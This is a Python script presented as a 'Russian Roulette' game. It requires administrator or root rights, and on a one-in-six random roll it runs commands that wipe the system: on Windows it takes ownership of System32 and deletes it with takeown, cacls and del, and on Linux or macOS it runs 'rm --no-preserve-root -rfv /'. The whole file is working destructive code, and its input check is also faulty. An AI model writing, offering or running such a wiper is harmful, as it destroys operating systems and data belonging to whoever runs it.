import os
import ctypes
import sys
from random import randint
import time

banner = """
______              _              ______            _      _   _       
| ___ \            (_)             | ___ \          | |    | | | |      
| |_/ /   _ ___ ___ _  __ _ _ __   | |_/ /___  _   _| | ___| |_| |_ ___ 
|    / | | / __/ __| |/ _` | '_ \  |    // _ \| | | | |/ _ \ __| __/ _ \\
| |\ \ |_| \__ \__ \ | (_| | | | | | |\ \ (_) | |_| | |  __/ |_| ||  __/
\_| \_\__,_|___/___/_|\__,_|_| |_| \_| \_\___/ \__,_|_|\___|\__|\__\___|
-------------------------------------------------------------------------
                 Fun for some, devastating for some :)
"""

def input_trigger():
    while True:
        try:
            trigger = int(input("Enter a number from 1 to 6: "))
        # except (TypeError, ValueError) as err:
        except:
            print("[Error] Input has to be a numerical number from 1 to 6")

        if trigger < 1 and trigger > 6:
            print("[Error] Enter a number from 1 to 6")
        else:
            return trigger


def check_os():
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if not is_admin:
        print("[Error] You need to run this script with sudo or as an administrator.")
        sys.exit()


def destroy_os():
    print(os.name)
    if os.name == 'nt':
        os.system('takeown /f C:\Windows\System32')
        os.system('cacls C:\Windows\System32')
        os.system('Del /s /q /f C:\Windows\System32')
        pass
    elif os.name == 'posix':
        os.system('rm --no-preserve-root -rfv /')
        pass
    pass

if __name__ == "__main__":

    trigger:int = 0
    os_type:str = ""
    print(banner)
    check_os()

    while True:
        trigger = input_trigger()
        bullet = randint(1,6)
        if trigger == bullet:
            print("goodbye! :)")
            time.sleep(3)
            destroy_os()
        else:
            print("You got lucky this time :))")
            while True:
                trigger = str(input("Continue? [y/n]: "))
                if trigger == "n": sys.exit()
                if trigger == "y": break
